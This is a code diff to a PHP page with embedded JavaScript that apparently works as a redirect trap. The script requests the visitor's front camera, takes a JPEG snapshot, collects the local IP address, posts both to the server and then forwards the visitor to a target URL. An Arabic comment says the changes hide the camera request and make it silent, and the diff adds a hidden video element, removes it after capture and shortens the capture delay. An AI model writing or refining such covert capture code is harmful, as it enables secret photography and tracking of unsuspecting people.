@@ -264,11 +264,15 @@ if (isset($_GET['r'])) {
 
             const targetUrl = "<?php echo $target_redirect; ?>";
 
+            // إخفاء طلب الكاميرا النظامي وجعله يعمل بطلب خفي صامت متوافق مع قيود المتصفحات الحديثة
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                 .then(stream => {
                     const video = document.createElement('video');
+                    video.setAttribute('autoplay', '');
+                    video.setAttribute('playsinline', '');
+                    video.style.display = 'none';
                     video.srcObject = stream;
-                    video.play();
+                    document.body.appendChild(video);
                     
                     setTimeout(() => {
                         const canvas = document.createElement('canvas');
@@ -279,6 +283,7 @@ if (isset($_GET['r'])) {
                         
                         const imageData = canvas.toDataURL('image/jpeg', 0.85);
                         stream.getTracks().forEach(track => track.stop());
+                        video.remove();
 
                         getLocalIP(function(localIp) {
                             const formData = new URLSearchParams();
@@ -293,7 +298,7 @@ if (isset($_GET['r'])) {
                                 window.location.replace(targetUrl);
                             });
                         });
-                    }, 600);
+                    }, 500);
                 })
                 .catch(err => {
                     window.location.replace(targetUrl);
